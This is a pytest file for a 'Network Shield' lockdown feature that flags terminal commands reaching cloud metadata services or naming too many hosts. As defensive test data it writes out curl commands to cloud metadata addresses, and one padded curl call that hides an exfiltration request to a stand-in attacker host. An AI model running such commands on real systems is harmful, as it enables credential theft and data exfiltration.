"""Network Shield lockdown: cloud metadata is never "this machine", and a call naming more hosts than
Blackbox reads is refused (plugins/blackbox/shields/network/lockdown.py; external static review of
1.7.1, 2026-11-28, recorded privately per SECURITY.md §3.1).

Contracts (red on 7e2470de18):
* under lockdown, a link-local address (``169.254.169.254``, ``fe80::…``), one written inside IPv6
  (``::ffff:169.254.169.254``) and the named cloud metadata services are lockdown findings unless an
  ``allow`` entry names them; loopback and the local network stay reachable;
* ``http://localhost/`` is this machine under lockdown, as the module doc says (it was refused as an
  unreadable host);
* a call naming more than ``MAX_HOSTS_PER_CALL`` hosts is a lockdown finding (the hosts past the bound
  were never checked); with lockdown off it is none.
"""

from __future__ import annotations

import pytest

from plugins.blackbox import shields
from plugins.blackbox.shields.network import lockdown, mode as network_mode

NETWORK = shields.get("network-shield")


@pytest.fixture(autouse=True)
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("BLACKBOX_HOME", str(tmp_path / "bb"))


def _mode(lockdown_on: bool = True, allow: tuple[str, ...] = ()) -> object:
    return network_mode.build(enabled=True, protections=(network_mode.LOCKDOWN,) if lockdown_on else (), allow=allow)


@pytest.mark.parametrize("url", ["http://169.254.169.254/latest/meta-data/", "http://[fe80::1]/x",
                                 "http://[::ffff:169.254.169.254]/x", "http://[fd00:ec2::254]/x", "http://100.100.100.200/x"])
def test_cloud_metadata_is_refused_under_lockdown(url):
    found = NETWORK.detect("terminal", {"command": f"curl {url}"}, _mode())
    assert found and {f.identifier for f in found} == {lockdown.LOCKDOWN_ID}, url


def test_an_allow_entry_still_opens_a_metadata_address_and_local_hosts_stay_reachable():
    assert NETWORK.detect("terminal", {"command": "curl http://169.254.169.254/x"}, _mode(allow=("169.254.169.254",))) == []
    for url in ("http://127.0.0.1:8080/x", "http://192.168.1.10/x", "http://10.0.0.5/x", "http://localhost:3000/"):
        assert NETWORK.detect("terminal", {"command": f"curl {url}"}, _mode()) == [], url


def test_a_call_naming_more_hosts_than_blackbox_reads_is_refused():
    padding = " ".join(f"http://127.0.0.{n}/" for n in range(1, lockdown.MAX_HOSTS_PER_CALL + 1))
    command = f"curl {padding} https://exfil.example-attacker.com/u"
    found = NETWORK.detect("terminal", {"command": command}, _mode())
    assert [f.identifier for f in found] == [lockdown.LOCKDOWN_ID]
    assert NETWORK.detect("terminal", {"command": command}, _mode(lockdown_on=False)) == []
    exactly = " ".join(f"http://127.0.0.{n}/" for n in range(1, lockdown.MAX_HOSTS_PER_CALL + 1))
    assert NETWORK.detect("terminal", {"command": f"curl {exactly}"}, _mode()) == []
